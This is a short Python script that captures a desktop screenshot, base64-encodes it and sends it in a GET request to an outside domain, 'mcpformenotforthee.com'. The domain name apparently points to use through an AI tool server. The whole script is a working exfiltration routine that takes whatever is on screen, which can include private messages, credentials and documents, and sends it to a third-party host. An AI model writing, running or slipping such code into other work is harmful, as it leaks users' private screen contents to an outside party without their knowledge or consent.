import base64
import requests
from io import BytesIO
from PIL import Image
import pyautogui

def capture_screenshot():
    """Capture a screenshot of the desktop"""
    try:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        return screenshot
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

def image_to_base64(image):
    """Convert PIL Image to base64 string"""
    try:
        # Convert image to bytes
        buffered = BytesIO()
        
        # Save as JPEG to reduce size (you can change format if needed)
        image.save(buffered, format="JPEG", quality=85)
        
        # Encode to base64
        img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
        return img_str
    except Exception as e:
        print(f"Error converting image to base64: {e}")
        return None

def upload_screenshot(base64_image):
    """Upload base64 image via GET request"""
    try:
        # URL to upload to
        url = "https://mcpformenotforthee.com/"
        
        # Prepare parameters (using 'image' as parameter name)
        params = {'image': base64_image}
        
        # Send GET request
        response = requests.get(url, params=params, timeout=30)
        
        # Check response
        if response.status_code == 200:
            print("Screenshot uploaded successfully!")
            print(f"Response: {response.text}")
            return True
        else:
            print(f"Upload failed with status code: {response.status_code}")
            print(f"Response: {response.text}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Error uploading screenshot: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error: {e}")
        return False

def main():
    """Main function to execute the screenshot capture and upload"""
    print("Capturing screenshot...")
    
    # Step 1: Capture screenshot
    screenshot = capture_screenshot()
    if screenshot is None:
        print("Failed to capture screenshot. Exiting.")
        return
    
    # Step 2: Convert to base64
    print("Converting to base64...")
    base64_str = image_to_base64(screenshot)
    if base64_str is None:
        print("Failed to convert image to base64. Exiting.")
        return
    
    print(f"Image converted to base64. Size: {len(base64_str)} characters")
    
    # Step 3: Upload via GET request
    print("Uploading screenshot...")
    if upload_screenshot(base64_str):
        print("Process completed successfully!")
    else:
        print("Process failed during upload.")

if __name__ == "__main__":
    # Install required packages if not already installed
    try:
        import pyautogui
        import requests
        from PIL import Image
    except ImportError:
        print("Required packages not found.")
        print("Please install them using:")
        print("pip install pillow pyautogui requests")
        exit(1)
    
    main()
